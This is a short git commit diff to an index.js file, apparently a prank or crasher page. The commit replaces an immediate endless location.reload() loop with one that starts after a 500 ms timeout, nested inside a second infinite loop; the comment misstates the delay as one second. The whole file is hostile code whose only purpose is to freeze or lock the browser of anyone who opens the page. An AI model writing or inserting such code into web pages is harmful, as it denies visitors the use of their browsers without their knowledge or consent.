28a3429960fd5913693ec411427ecc54f42bd546
Digital-S <127454668+DigitalSerpant@users.noreply.github.com>
2023-04-03 18:54:48 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,7 @@
-(function(){while(1){location.reload()}}())
+var delayInMilliseconds = 500; //1 second
+
+setTimeout(function() {
+    while(1==1){
+        (function(){while(1){location.reload()}}())
+    }
+}, delayInMilliseconds);
